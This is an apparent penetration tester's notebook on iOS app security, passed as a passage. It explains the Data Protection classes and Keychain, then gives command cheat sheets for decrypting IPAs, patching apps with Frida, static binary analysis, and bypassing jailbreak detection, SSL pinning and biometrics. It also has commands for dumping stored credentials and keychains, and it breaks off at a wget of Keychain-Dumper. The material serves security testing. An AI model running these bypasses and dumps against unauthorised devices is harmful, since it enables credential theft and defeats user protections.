- **System Integrity Protection (SIP)**: Limits the capabilities of the root user to protect system integrity, reducing the attack surface available to malware and attackers.
###### Data Protection


![[filesystem.png]]

**Data Protection** is a technology used to protect data stored in flash storage on the devices; it's implemented by constructing and managing a hierarchy of keys and builds on the hardware encryption technologies built into Apple devices. 

Data Protection is controlled on a **per-file basis** by assigning each file to a **class**; every time a file on the data volume is created, **Data Protection** creates a new 256-bit key
(the **file key**) and gives it to the hardware AES Engine, which uses the key to encrypt
the file as it’s being written to flash storage. 

The accessibility of the file is determined according to whether the class keys have been unlocked:

- The **file key** is stored in the **file metadata**.
- **File metadata** is encrypted with the mean of the **file system key**. This key is kept in **Effaceable Storage** to facilitate fast wipe rather than confidentiality and it's protected by the hardware UID.
- When a file is opened, its **metadata** is decrypted with the **file system key**, revealing the wrapped **file key** and a notation on which class protects it. 
- The per-file (or per-extent) key is unwrapped with the **class key** and then supplied to the hardware AES Engine, which decrypts the file as it’s read from flash storage.
- The **class key** is protected with the hardware UID and, for some classes, the user’s passcode.

When a new file is created on devices supporting Data Protection, it’s assigned a **class** by the app that creates it. Each class uses different policies to determine when the data is accessible:

- **Complete Protection (NSFileProtectionComplete)**: The **class key** is protected with a key derived from the user passcode or password and the device UID. Shortly after the user locks a device (10 seconds, if the Require Password setting is Immediately), the decrypted class key is discarded, rendering all data in this class inaccessible until the user enters the passcode again or unlocks (logs in to) the device using Optic ID, Face ID or Touch ID.
- **Protected Unless Open (NSFileProtectionCompleteUnlessOpen)**: It's used when some files needs to be written while the device is locked or the user is logged out (e.g. a file downloading in the background). The file is decrypted when the device is unlocked but it remains accessible even though the device is then locked. This behaviour is achieved by using asymmetric elliptic curve cryptography (ECDH over Curve25519). The **file key** is protected by a key derived using One-Pass Diffie-Hellman Key Agreement. As soon as the file is closed, the **file key** is wiped from memory. To open the file again, the shared secret is re-created using the Protected Unless Open class’s private key and the file’s ephemeral public key, which are used to unwrap the **file key** that is then used to decrypt the file.
- **Protected Until First User Authentication (NSFileProtectionCompleteUntilFirstUserAuthentication)**: This class behaves in the same way as Complete Protection, except that the decrypted class key isn’t removed from memory when the device is locked or the user logged out. 
- **No Protection (NSFileProtectionNone)**: This class key is protected only with the UID and is kept in Effaceable Storage. Since all the keys needed to decrypt files in this class are stored on the device. The only benefit with this encryption is the fast remote wipe. This isn’t supported in macOS.

**If a file isn’t assigned a Data Protection class, it is still stored in encrypted form (as is all data on an iOS device).**

###### Inter-Process Communication - IPC

**Universal Links**: Deep-linking mechanism that allows users to open specific content within an app from a standard web link.

**URL Schemes**: Apps can open other apps or send data by specifying a custom URL scheme.

**UIPasteboard**: enables sharing data within applications. There are two types of pasteboard:

- **Systemwide Pasteboard**: Sharing data with any application.
- **Custom Pasteboard**: Sharing data with app having same team ID.

An application can possibly prevent to copy sensitive data to the clipboard.

**App Groups and Shared Containers**: Allow apps from the same developer to share files and data securely.

**XPC Services**: Lightweight services that allow apps to communicate with separate processes. It's a low level inter-process communication mechanism.

######  Plist and Entitlements

The entitlement `com.apple.developer.associated-domains` allows an app to securely associate with specific domains.

- `applinks:` → Universal Links
- `webcredentials:` → Shared Web Credentials
- `appclips:` → App Clip invocation

URL schemes are registered in the Info.plist in the `CFBundleURLTypes` property. It's necessary to distinguish `CFBundleURLTypes` from `LSApplicationQueriesSchemes`.

- `CFBundleURLTypes`: Declares **which custom URL schemes your app can _handle_**. Other apps (or Safari) can open your app via `UIApplication openURL:` or universal links.
- `LSApplicationQueriesSchemes`: Declares **which custom URL schemes your app is _allowed to query_**. Needed when you want to check if another app is installed before opening it.
###### Keychain

It's an encrypted container or sandbox where every application can store sensitive pieces of information and only an authorised app can retrieve the its content.

- iOS generates its own password for the keychain. This password is stored encrypted on the device: it's encrypted with AES using a key generate by applying PBKDF2 on the user's passcode to which is added a salt (generally, the device's UID - this makes impossible for another device to decrypt the Keychain password).

Keychains can use **access control lists (ACLs)** to set policies for accessibility and authentication requirements. Items can establish conditions that require user presence by specifying that they can’t be accessed unless authenticated using Optic ID, Face ID or Touch ID, or by entering the device’s passcode or password. 

- Access to items can also be limited by specifying that Optic ID, Face ID or Touch ID enrolment hasn’t changed since the item was added. This limitation helps prevent an attacker from adding their own fingerprint to access a keychain item. 
- ACLs are evaluated inside the Secure Enclave and are released to the kernel only if their specified constraints are met.

Following the access control flags:

- **kSecAccessControlDevicePasscode**: Item is accessible after the user enters the device passcode.
- **kSecAccessControlBiometryAny**: Item is accessible using any enrolled biometric (Touch ID or Face ID); adding or removing biometrics does not invalidate the item.
- **kSecAccessControlBiometryCurrentSet**: Item is accessible using the current biometric set (Touch ID or Face ID); adding or removing a biometric invalidates the item.
- **kSecAccessControlUserPresence**: Item is accessible after user presence is confirmed (biometric or passcode); falls back to passcode if biometric is unavailable.
- **kSecAccessControlApplicationPassword**: Item requires an application‑specific password provided by your app.
- **kSecAccessControlPrivateKeyUsage**: Item is accessible only when used for private key operations.
- **kSecAccessControlWatch**: Item is accessible when an authenticated Apple Watch is nearby (watchOS 6 or later).

The accessibility of a Keychain item is determined by the `kSecAttrAccessible` key set when adding (`SecItemAdd`) or updating (`SecItemUpdate`) it. The following configurable accessibility values for [kSecAttrAccessible](https://developer.apple.com/documentation/security/item-attribute-keys-and-values###1679100) are the Keychain Data Protection classes:

- `kSecAttrAccessibleAlways`: The data in the Keychain item can always be accessed, regardless of whether the device is locked.
- `kSecAttrAccessibleAlwaysThisDeviceOnly`: The data in the Keychain item can always be accessed, regardless of whether the device is locked. The data won't be included in an iCloud or local backup.
- `kSecAttrAccessibleAfterFirstUnlock`: The data in the Keychain item can't be accessed after a restart until the device has been unlocked once by the user.
- `kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly`: The data in the Keychain item can't be accessed after a restart until the device has been unlocked once by the user. Items with this attribute do not migrate to a new device. Thus, after restoring from a backup of a different device, these items will not be present.
- `kSecAttrAccessibleWhenUnlocked`: The data in the Keychain item can be accessed only while the device is unlocked by the user.
- `kSecAttrAccessibleWhenUnlockedThisDeviceOnly`: The data in the Keychain item can be accessed only while the device is unlocked by the user. The data won't be included in an iCloud or local backup.
- `kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly`: The data in the Keychain can be accessed only when the device is unlocked. This protection class is only available if a passcode is set on the device. The data won't be included in an iCloud or local backup.


###### App Extensions

App Extensions allow to create custom functionalities and content that can be integrated into existing system applications.

When developing an **application extension**, the extension's **extension point** must be declared in your app's `Info.plist` using the `NSExtension` dictionary. Within this dictionary, the `NSExtensionPointIdentifier` key specifies the type of extension you're implementing.

Common Extension Point Identifiers (for `NSExtensionPointIdentifier`):

- **com.apple.widget-extension**: Home Screen or Notification Center widgets (using WidgetKit).
- **com.apple.share-services**: Share extensions (e.g., share content to your app from other apps).
- **com.apple.ui-services**: Action extensions (e.g., modify or view content from another app).
- **com.apple.keyboard-service**: Custom keyboard extensions.
- **com.apple.intents-service**: SiriKit Intent extensions (handle voice commands).
- **com.apple.callkit.call-directory**: Call Directory extensions (block or identify callers).
- **com.apple.watchkit**: WatchKit extensions for watchOS apps.
- **com.apple.fileprovider-ui**: UI for File Provider extensions (used in Files app integration).
- **com.apple.document-manager**: Document Picker extensions (import/export documents).
- **com.apple.photo-editing**: Photo editing extensions for the Photos app.
- **com.apple.messages-app**: iMessage app extensions.
- **com.apple.sticker-pack**: Static sticker packs for iMessage.    
- **com.apple.keyboard.quicktype.preview**: QuickType keyboard preview extensions.
- **com.apple.intents-ui-service**: Custom UI for SiriKit intents.

###### WebViews

There are three types of web view:

- `UIWebView`: It's deprecate starting from iOS 12. **JavaScript cannot be disabled**.
- `WKWebView`: 
	- JavaScript is enabled by default but can be disabled by mean of the `javaScriptEnabled` property.
	- `javaScriptCanOpenWindowsAutomatically` property can be used to control whether JavaScript is allowed to open windows or not on the web view.
	- `hasOnlySecureContent` property can be used to verify that resources are received using an encrypted connection.
	- This webview does not support alerts!
- `SFSafariViewController`:
	- JavaScript cannot be disabled.
	- Shares cookies and website data with Safari.
	- The user's activity and interaction are not visible to the app.

A **JavaScript-to-native bridge** lets JavaScript running inside a `WKWebView` call into native Swift/Objective-C code, and optionally lets native code call back into JS.  
This is usually implemented with `WKScriptMessageHandler` (for JS → native) and `evaluateJavaScript(_:completionHandler:)` (for native → JS).  
It’s the mechanism behind hybrid frameworks (Cordova, React Native, etc.) to access iOS APIs (e.g. camera, storage).

###### IPA

IPA structure:

- **Info.plist** – Contains app metadata like bundle identifier, version, permissions, and configurations.
- **\_CodeSignature/** – Holds cryptographic signatures ensuring the app hasn’t been tampered with.
- **Asset.car** – Compiled asset catalog containing images, icons, and UI resources.
- **Frameworks/** – Bundled dynamic frameworks or libraries used by the app.
- **Core Data/** – Used to save application's permanent data for offline usage, to cache temporary data, etc.
- **PkgInfo** – Legacy file indicating the app package type and creator code.
- The application **Mach-O** binary.

`Info.plist` interesting keywords:

- `UsageDescription`: App Permissions ("Purpose Strings")
- `CFBundleSupportedPlatforms`: Contains the list of supported platforms (e.g. iPhone, simulator, iPad, etc.)
- `UIRequiredDeviceCapabilities`: Contains the supported architectures (e.g. armv7, arm64, x86-x64, etc.)
- `CFBundleShortVersionString`: App bundle version
- `CFBundleURLTypes`: Custom URL schemes. 
	- It also contains an entry for `CFBundleURLName` which is a unique identifier for the applications.
- `UTExportedTypeDeclarations`: Exported custom document types
- `UTImportedTypeDeclarations`: Imported custom document types
- `NSAppTransportSecurity`: App Transport Security (e.g. HTTP or HTTPS). 
	- `NSAllowsArbitraryLoads`: when enabled, it disables the App Transport Security (ATS) restrictions for all domains not specified in the `NSExceptionDomains` dictionary. This allows unsecured HTTP connections.
- `UIMainStoryboardFile`: Contains the main file of the application (the first file that is ran).

### Lab Setup

#### Screen Mirroring

`ioscpy` is cool tool that allows to mirror a jailbroken iPhone screen, much like `scrcpy` for Android:

- [ioscpy](https://github.com/lautarovculic/ioscpy)

#### SSH through USB

Using `iproxy` it's possible to SSH to the mobile device via USB (no need to be in the same network):

~~~shell
iproxy 2222 22
~~~

Install `iproxy` with `brew`:

~~~shell
brew install libusbmux
~~~

#### iPhone SSHFS

It's possible to locally mount the iPhone file system via ssh using `sshfs`:

1. Install macFUSE and sshfs from [here](https://macfuse.github.io)
2. Enable support for third party kernel extensions following [this guide](https://github.com/macfuse/macfuse/wiki/Getting-Started###enabling-support-for-third-party-kernel-extensions-apple-silicon-macs)
3. Connect the device with the USB cable (recommended for better performance)
4. Run `iproxy 2222 22`
5. Run `sshfs -p 2222 mobile@localhost:/ <mount point>`
6. When tasks are finished, unmount the device with `umount <mount point>`

#### Install IPA/APP on non-Jailbreaken device

Manually:

1. Install [Sideloadly](https://sideloadly.io/###download)
2. If it's blocked as malware, allow running from Settings -> Privacy and Security
3. Insert AppleID and the password
4. Drag and drop IPA
5. Click on start

Using `ios-deploy`:

~~~shell
ios-deploy -b <.app path> --debug -W
~~~

#### Install IPA/APP on simulator 

**Method 1:**

1. Rename `.ipa` to `.zip`
2. Unzip
3. Drag and drop the “.app” within “Payload” folder to the simulator 

**Method 2**:

 Use `xcrun`:
  
 ~~~shell
 xcrun simctl install booted <appname>.<app or ipa>
 ~~~

#### Extract and Decrypt IPA

It's possible to extract an IPA using [frida-ios-dump](https://github.com/AloneMonkey/frida-ios-dump)

- it's pretty outdated - might not work.
- requires jailbroken device


~~~shell
### Requires local port forwarding
iproxy 2222 22

### List installed apps
python dump.py -l

### Extract the IPA
python dump.py [-u <mobile username>] [-P <mobile password>] <Display Name>|<Bundle Identifier> 
~~~

Take a look to:

- https://github.com/ChiChou/bagbak?tab=readme-ov-file
- https://github.com/paradiseduo/appdecrypt

When dealing with unencrypted IPAs, it's possible to extract them manually as follows:

1 - SSH to the device and go to:

~~~
/var/containers/Bundle/Application/<bundle id>
~~~

1.1 - Get bundle ID manually:

~~~shell
find /var/containers/Bundle/Application -name "<app name>.app" | cut -d "/" -f 6
~~~

1.1 - Get application bundle full path with `objection`:

~~~shell
objection -g <app identifier> explore
> ios bundles list_bundles --full-path
~~~

2 - Re-bundle the IPA as follows:

~~~shell
mkdir Payload
cp -r <app name>.app Payload
zip -r <app name>.ipa Payload
~~~

3 - Copy the IPA to the machine:

~~~shell
scp <mobile user>:<mobile password>:/var/containers/Bundle/Application/<app name>.ipa <output directory>
~~~

4 - Cleanup on the mobile device:

~~~shell
rm -rf Payload <app name>.ipa
~~~

#### Patch IPA with frida gadget

This is useful when testing on a non jailbroken device or on a simulator.

Install [insert_dylib](https://github.com/tyilo/insert_dylib):

~~~shell
git clone https://github.com/Tyilo/insert_dylib  
cd insert_dylib  
xcodebuild  
cp build/Release/insert_dylib /usr/local/bin/insert_dylib
~~~

#### Patch IPA with frida gadget - Objection

From `xcode`, locate the provisioning profiles:

1. Open `xcode`
2. Settings > Accounts
3. Select the account and click on "Download Manual Profiles"
4. Profiles will be stored at `~/Library/Developer/Xcode/UserData/Provisioning\ Profiles`

Get signing identity:

~~~shell
applesign -L
### or
security find-identity -p codesigning -v
~~~

Patch the IPA with `obsidian`:

~~~shell
objection patchipa --source <ipa path> --codesign-signature <signing identity> -P <provisioning profile path> [-V <frida version | default to last>]
~~~

**ATTENTION**: if the ipa is to be ran on a simulator, by default objection will NOT download the iOS simulator build for the gadget dylib. 

1. After running `objection patchipa`, download the correct dylib from https://github.com/frida/frida/releases/.
2. Replace the `FridaGadget.dylib` in the `~/.objection/ios` with the downloaded dylib (renamed exactly to `FridaGadget.dylib`)
3. Re-run `objection patchipa` - this time `objection` will use the correct dylib

**ATTENTION** (again): For some reason, if the app still crashes, try **re-signing** it as follows:

1. Unzip the patched ipa: `unzip <patched ipa>`
2. Run: `codesign --force --sign - --deep Payload/<appname>.app`
3. Install the .app or re-bundle the Payload folder into a .ipa zip


Launch the app and connect to it with `obsidian` or `frida`:

~~~shell
### Objection
objection -h localhost -N explore

### Frida
frida -H localhost Gadget
~~~

#### Patch IPA with frida gadget - Manual

Unzip the .ipa:

~~~shell
unzip <appname>.ipa
~~~

Patch the Mach-O binary with `insert_dylib`:

~~~shell
insert_dylib --all-yes @executable_path/frida-gadget.dylib Payload/<appname>.app/<appname> Payload/<appname>.app/<appname>.patched
~~~

Replace the Mach-O binary:

~~~shell
mv Payload/<appname>.app/<appname>.patched Payload/<appname>.app/<appname>
~~~

Copy the frida gadget dylib into the .app root folder (due to `@executable_path/frida-gadget.dylib`):

~~~shell
cp frida-gadget.dylib Payload/<appname>.app/
~~~

Re-sign the app:

~~~shell
codesign --force --sign - --deep Payload/<appname>.app
~~~

Install the .app or re-bundle the Payload folder into a .ipa.

It's possible to re-sign an ipa using `applesign`:

~~~shell
applesign -i <signing identity> -m <provisioning file> <.ipa to re-sign>
~~~

#### Jailbreaking

Following resources provide an exhaustive list of available jailbreaks:

- https://theapplewiki.com/wiki/Jailbreak
- https://ios.cfw.guide/get-started/ 

#### Proxy Configuration

##### SSL Certificate Installation

1. Set burp as proxy: Settings -> Wifi -> `<Current WIFI connection>` -> Configure Proxy
2. Download the certicate from `http://burp`
3. Settings -> VPN & Device Management -> Click on downloaded profile (the certificate) -> Install the profile
4. Settings -> General -> About -> Trusted Certificates -> "Enable full trust for root certificates" for PortSwigger CA

##### Simulator Proxy

The simulator uses the system-wide proxy; it's possible to restrict proxy to particular hostnames as follows. This is useful when testing on simulator, avoiding to intercept all the system network traffic on Burp.

1 - Create a `.pac` script like the following:

~~~pac
function FindProxyForURL(url, host) {
    PROXY = "PROXY localhost:8080"
	
	// Match only interesting hostname, e.g. *.test.com
    if (shExpMatch(host,"*.test.com")) {
        return PROXY;
    }
    
    // Everything else directly!
    return "DIRECT";
}
~~~

2 - Run a python web server in the same folder of the `.pac` script:

~~~shell
python3 -m http.server
~~~

3 - Configure the proxy on the MacOS settings:

1. Settings > Network > Wi-Fi (or the network being used) > Current Connection's details > Proxies Tab
2. Toggle "Automatic proxy configuration" and set the URL to `http://localhost:8000/<pac script>.pac`

### Static Analysis

`otool` reversing cheatsheet:

~~~shell
### View architectures in a universal (fat) binary
otool -f <binary>

### Print Mach-O header
otool -h <binary>

### Print detailed Mach-O header
otool -Hv <binary>

### List shared libraries linked to the binary
otool -L <binary>

### List all Mach-O load commands
otool -l <binary>

### Dump contents of a specific section (e.g., __text in __TEXT)
otool -s __TEXT __text <binary>

### Print all sections of a given segment
otool -v -s __DATA __objc_classlist <binary>

### Show symbol table
otool -Iv <binary>

### List Objective-C class names
otool -o <binary>

### List Objective-C methods
otool -ov <binary> | grep method

### Disassemble instructions in the __TEXT,__text section
otool -tV <binary>

### Disassemble ARM64 binary explicitly
otool -tV --arch arm64 <binary>
~~~


Check if **PIE (Position Independent Executable)** enabled during build:

~~~shell
otool -hv <app-binary> | grep PIE
~~~

Check if **Stack Canaries** enabled during build:

~~~shell
otool -I -v <app-binary> | grep stack_chk
~~~

Check if **ARC (Automatic Reference Counting)** enabled during build:

~~~shell
otool -I -v <app-binary> | grep objc_release
~~~

Check if the binary is **Encrypted**:

~~~shell
otool -arch all -Vl <app-binary> | grep -A5 LC_ENCRYPT
~~~

Vulnerable and insecure functions usage:

~~~shell
### Insecure Algorithms
otool -I -v <app-binary> | grep "_CC_MD5"
otool -I -v <app-binary> | grep "_CC_SHA1"

### Insecure functions/methods
otool -I -v <app-binary> | grep "_random"
otool -I -v <app-binary> | grep "__srand"
otool -I -v <app-binary> | grep "_rand"
otool -I -v <app-binary> | grep "_gets"
otool -I -v <app-binary> | grep "_memcpy"
otool -I -v <app-binary> | grep "_strncpy"
otool -I -v <app-binary> | grep "_strlen"
otool -I -v <app-binary> | grep "_vsnprintf"
otool -I -v <app-binary> | grep "_sscanf"
otool -I -v <app-binary> | grep "_strtok"
otool -I -v <app-binary> | grep "_alloca"
otool -I -v <app-binary> | grep "_sprintf"
otool -I -v <app-binary> | grep "_printf"
otool -I -v <app-binary> | grep "_vsprintf"
~~~

Search vulnerable and insecure functions usage recursively:

~~~shell
for f in $(find ./ -type f); do res=$(otool -I "$f"); if [[ ! "$res" =~ "is not an object file" ]]; then echo "\n=== Analyzing: $f ==="; otool -I -v "$f" | grep -E "_fopen|_sscanf|_strlen" ; fi; done
~~~

Find method/function usage with `radare2`:

~~~shell
### Open binary with auto-analysis
r2 -A MyAppBinary

### Search for a method/function string inside the binary
/ methodName

### List all symbols (functions, imports, exports)
is

### Filter symbols by keyword
is~methodName

### List all analyzed functions
afl

### Filter analyzed functions by keyword
afl~methodName

### Get cross-references (xrefs) to a function/symbol by address
axt 0xADDRESS

### Get cross-references (xrefs) to a function/symbol by name
axt sym.methodName

### Disassemble function at given address
pdf @ 0xADDRESS

### Search for Objective-C selectors (methods ending with :)
/C myMethod:

### Find xrefs to objc_msgSend (indirect ObjC method calls)
/C objc_msgSend
~~~

String searching and dumping with `radare2`:

~~~shell
### Search for string
/ <string to search>

### Search for byte sequence
/x <byte sequence to search> ###eg: /x 68656c6c6f20776f726c64

### List all strings in binary
iz

### Filter strings by keyword
iz~keyword

### Dump string at a given address
ps @ 0xADDRESS

### Dump null-terminated string at a given address
psz @ 0xADDRESS

### From shell, dump all strings without entering r2
r2 -q -c iz MyAppBinary

~~~

Search byte sequence with `otool`:

~~~shell
otool -tVv MyAppBinary | grep -A4 -B4 "<byte sequence>"
~~~

Check Architecture with `lipo`:

~~~shell
lipo -info Payload/MyApp.app/MyApp
~~~

Check target build platform with `otool`:

~~~shell
otool -l <appname>.app/<appname> | grep -A3 LC_BUILD_VERSION
~~~

- `platform 2` = iOS (real device) 
- `platform 7` = iOS Simulator
- (Others: `1` macOS, `3` tvOS, `5` watchOS, etc.)

Check build platform using `vtool`:

~~~shell
vtool -show-build <appname>.app/<appname> 
~~~

 Check linked libraries with `otool`:

~~~shell
otool -L <appname>.app/<appname>
~~~

Check runtime paths with `otool`:

~~~shell
otool -l <appname>.app/<appname> | grep -A2 RPATH
~~~

Get code signature format using `codesign`:

~~~shell
codesign -dv <.app path>
~~~

Check entitlements with `codesign`:

~~~shell
codesign -dvvvv --entitlements :- Payload/MyApp.app/MyApp
~~~

Check entitlements with `ipsw`:

~~~shell
ipsw ent --input <binary> --key <entitlement>
ipsw macho info -e <binary>
~~~

- If the entitlement `get-task-allow` is present, the application is built with debug symbols.

Check if build with debug symbols using `objdump`:

~~~shell
objdump --syms <binary> | grep "d  "
~~~

Get Plist content with `plutil`:

~~~shell
plutil -p Info.plist
~~~
  
Get `MinimumOSVersion` with `plutil`:

~~~shell
plutil -p Info.plist | grep MinimumOSVersion
~~~

Get binary information with `objection`:

~~~shell
objection -g <app identifier> run "ios info binary"
~~~

Get binary info with [ipsw](https://github.com/blacktop/ipsw):

~~~shell
ipsw macho info <binary>
~~~

Disassemble binary with `ipsw`:

~~~shell
ipsw macho disass <binary> --symbol _main
~~~

Search string into binary with `ipsw`:

~~~shell
ipsw macho search <binary> --string "<string to search>"
~~~

Get dynamically loaded libraries with `ipsw`:

~~~shell
ipsw macho info <binary> | grep LC_LOAD_DYLIB | cut -d " " -f 17 
~~~

Dump Objective-C classes with `ipsw`:

~~~shell
### Raw dump
ipsw class-dump <binary>
### Demangled dump
ipsw class-dump --demangle <binary>
### Dump ObjC headers
ipsw class-dump --headers -o <output dir> <binary>
~~~

Dump Swift classes with `ipsw`:

~~~shell
ipsw swift-dump <binary>
ipsw swift-dump --demangle <binary>
### Create separate header files for each Swift type/protocol/extension
ipsw swift-dump --headers -o <output dir> <binary>
~~~

Check if WebViews are being used:

~~~shell
strings <binary> | grep -i "UIWebView"
strings <binary> | grep -i "WKWebView"
strings <binary> | grep -i "SFSafariViewController"
~~~

Cross-compile a dynamic library from MacOS for iOS:  

~~~shell
clang -arch arm64 -miphoneos-version-min=15.0 -isysroot "$(xcrun --sdk iphoneos --show-sdk-path)" -dynamiclib -install_name @rpath/libexampl  
e.dylib License.c -o license.dylib
~~~

#### Objective-C Analysis

**Step 1: Review Header Files**

A typical Objective-C header file looks like this:

~~~objective-c
###ifndef MYZipWriter_h
###define MYZipWriter_h
@import Foundation;

###include "MYWriter-Protocol.h"
###include "MYZip.h"

@class NSMutableData, NSObject, NSString;

@interface MYZipWriter : NSObject <MYWriter> {
    /* instance variables */
    id <MYWriter> _writer;
    MYZip *_zipper;
    NSMutableData *_zippedBuf;
    struct { void *bytes; unsigned long long length; } _zipped;
}

@property (readonly) unsigned long long hash;
@property (readonly) Class superclass;
@property (readonly, copy) NSString *description;
@property (readonly, copy) NSString *debugDescription;

/* instance methods */
- (id)initWithWriter:(id)writer compressing:(_Bool)compressing;
- (_Bool)writeSlice:(struct { void *x0; unsigned long long x1; })slice;
- (_Bool)writeData:(id)data;
- (_Bool)writeContentsOfStream:(id)stream;

@end

###endif /* MYZipWriter_h */
~~~

Key Elements:

- **Class Inheritance**: The class declaration (**@interface**) shows the class and the superclass it inherits from. For example, **MYZipWriter : NSObject** indicates that **MYZipWriter** is a custom class inheriting from **NSObject**, and it conforms to the **MYWriter** protocol.
- **Properties**: The class’s properties include typical read-only properties inherited from **NSObject**, such as **hash**, **superclass**, **description**, and **debugDescription**, indicating that **MYZipWriter** inherits common object properties.
- **Variables**: The class has several instance variables declared in the interface block. These include:
	-  **\_writer**: an object conforming to the **MYWriter** protocol, likely used to handle writing operations.
	-   **\_zipper**: an instance of **MYZip**, probably responsible for managing zip-related functionality.
	-   **\_zippedBuf**: an **NSMutableData** object, likely used as a buffer to store compressed data.
	-  **\_zipped**: a structure containing raw byte data (**void \*bytes**) and its length, which is likely used to handle low-level zip data manipulation.
- **Methods**: Look for methods the class exposes. These are defined with **-** or **+** (instance and class methods respectively). Examples include **- (id)initWithWriter:(id)writer compressing:(\_Bool)compressing**, an initializer likely used to configure the writer and compression settings, and data-writing methods such as **- (\_Bool)writeSlice:** and - **(\_Bool)writeData:**, which suggest functionality for writing data slices and other content.

Determine Potential Attack Surfaces:

- Look for methods that handle **network requests**, **data serialization**, **encryption**, or **user input**. These are often crucial for security testing.
- Look for properties like **NSString**, **NSDictionary**, **NSArray**, or **NSData** that store sensitive data, such as passwords or API tokens.

**Step 2: Analyze the Methods**

Once you have identified the methods in the header files, think about what they do:

- **Networking Methods**: Methods like **- (void)fetchDataFromURL:(NSURL *)url** suggest that the app communicates with external servers. Look into these methods for potential issues such as insecure HTTP requests or improper handling of responses.
- **Authentication and User Data**: Methods like **- (void)loginWithUsername:(NSString *)username password:(NSString *)password** or properties like **userToken** may indicate where authentication logic happens. These areas are important for identifying vulnerabilities such as weak password handling or insecure storage of sensitive information.

#### Swift Analysis

**Step 1: Review Swift Class Names and Methods**

 Below a snippet with a typical Swift class structure from the **swift_dump** file:
 
~~~swift
class DVIA_v2.ApplicationPatchingDetailsViewController: UIViewController {
  /* fields */
    var usernameTextField: UITextField?
    var passwordTextField: UITextField?
  /* methods */
    func ApplicationPatchingDetailsViewController.usernameTextField.getter
    func ApplicationPatchingDetailsViewController.usernameTextField.setter
    func ApplicationPatchingDetailsViewController.usernameTextField.modify
    func ApplicationPatchingDetailsViewController.passwordTextField.getter
    func ApplicationPatchingDetailsViewController.passwordTextField.setter
    func ApplicationPatchingDetailsViewController.passwordTextField.modify
    func ApplicationPatchingDetailsViewController.loginButtonTapped(_:)
    func ApplicationPatchingDetailsViewController.jailbreakTestTapped(_:)
    func ApplicationPatchingDetailsViewController.showAlertTapped(_:)
    func ApplicationPatchingDetailsViewController.killApplicationTapped(_:)
    func ApplicationPatchingDetailsViewController.textFieldShouldReturn(_:)
}
~~~

Key Elements:

- **Class Names**: Look for class names to identify the app’s architecture. Names like **UserManager**, **NetworkClient**, or **EncryptionHandler** give a clear indication of the app’s key components.
- **Field Names**: The class contains fields such as **usernameTextField** and **passwordTextField**, which are likely used for user input related to login credentials. These **UITextField?** types suggest the view controller manages a login or authentication interface, as indicated by the presence of these input fields.
- **Method Names**: Look at the method names for functionality. Methods like **func loginButtonTapped(\_:)** indicate user authentication logic, while **func sendRequestOverUrl(\_:)** may indicate a network request.

**Step 2: Analyze Swift Method Names**

Look for important method names and infer their role:  
  
- **Network-related Methods**: Methods like **func fetchData(\_:)** or **func sendRequest(\_:)** are indicators that the app interacts with external services. You can review these methods to understand how data is transmitted or received.  
- **Cryptography Methods**: Look for names like **func encryptData(\_:)** or **func decryptData(\_:)**. This gives you insight into how the app manages encryption, which is essential when analyzing apps that handle sensitive information.  
- **Error Handling**: Methods like **func showError(\_:)** or **func handleError(\_:)** may reveal how the app responds to errors. Poor error handling can sometimes reveal sensitive information to an attacker.
#### Nuclei

Run `nuclei` templates on the application's plist:

~~~shell
echo <plist path> | nuclei -t /<path-to-template-folder> -file
~~~

#### Forensics

https://www.mobilehackinglab.com/blog/tool-review-exploring-ileapp-for-ios-forensics

### Dynamic Analysis

#### Jailbreak Detection Bypass

Useful resources:

- https://codeshare.frida.re
- https://jlippold.github.io/tweakCompatible/package.html###!/com.ryleyangus.libertylite/details/0.2.10
- https://github.com/jjolano/shadow

Try bypassing Jailbreak detection with `objection`:

~~~objection
> ios jailbreak disable
~~~

Simulate a Jailbroken device with `objection` - useful to check if the app has Jailbreak detection checks when testing in non-Jailbroken environment:

~~~objection
> ios jailbreak simulate
~~~

#### SSL Pinning Bypass

Bypass SSL pinning with `objection`:

~~~objection
> ios sslpinning disable
~~~

Bypass SSL pinning with [ssl-kill-switch3](https://github.com/NyaMisty/ssl-kill-switch3):

1. Download the .deb packaged depending on Jailbreak type (rootless or rootful)
2. Run `dpkg -i <.deb>` to install the tweak
3. In `Setting > SSL Killswitch 3` toggle SSL pinning
4. Each time SSL pinning is toggled, close and re-open the application for the change to take effect.

Check hooked classes and methods for SSL Pinning bypass with `objection`:

~~~objection
> ios hooking list classes | grep NSURL
> ios hooking list methods -c NSURLSession
~~~

#### TouchID Bypass

Trace biometrics usage (LocalAuthentication.framework) with `frida-trace`:

~~~shell
frida-trace -U -m "*[LAContext *]" -p <PID>
~~~

Bypass TouchID authentication with `objection`:

~~~shell
> ios ui biometrics_bypass
~~~

#### UIPasteboard

Monitor UIPasteboard inputs with `objection`:

~~~objection
> ios pasteboard monitor
~~~

#### Local Data Storage

Check `Info.plist` at path: `/var/containers/Bundle/Application/<bundle id>`

Check local storage at path: `/var/mobile/Containers/Data/Application/<data id>`

Data id can be found as follows:

~~~shell
grep -RiaoH '<app name>' /var/mobile/Containers/Data/Application 2>/dev/null | head -n 1 | cut -d / -f 7
~~~

Enumerate all possible application databases:

~~~shell
find /var/mobile/Containers/Data/Application/<data id> -name "*.sqlite*" -or -name "*.db"
~~~

Search for JWT (e.g in the Data folder):

~~~shell
grep -RiahE '^ey([a-zA-Z0-9_=]+)\.([a-zA-Z0-9_=]+)\.([a-zA-Z0-9_\-\+\/=]*)' /var/mobile/Containers/Data/Application/<data id> 
~~~

When dealing with simulators, replace `/var/mobile` with `~/Library/Developer/CoreSimulator/Devices/<simulator UDID>/data`.

##### UserDefaults

Values stored in the `NSUserDefaults` are generally located at: `/var/mobile/Containers/Data/Application/<data id>/Library/Preferences/<app identifier>.plist`

When using **suite names** (e.g. `initWithSuiteName:` or App Groups), the file is stored in the _App Group container_ under `Library/Preferences/` instead of the main container.

`NSUserDefaults` is generally used to store small pieces of application information, typically settings. 

Get `NSUserDefaults` with `objection`:

~~~shell
### Open the app with objection (will be DEPRECATED)
objection -g <app identifier> explore

### Get user defaults content
> ios nsuserdefaults get
~~~

##### Shared Credentials Storage

The manager of a shared credentials cache.

Dump `NSUrlCredentialsStorage` with `objection`:

~~~shell
> ios nsurlcredentialstorage dump
~~~

##### Keychain

Dump device keychain content with [Keychain-Dumper](https://github.com/ptoomey3/Keychain-Dumper):

~~~shell
wget https://raw.githubusercontent.com/ptoomey3/Keychain-Dumper/refs/heads/master/updateEntitlements.sh
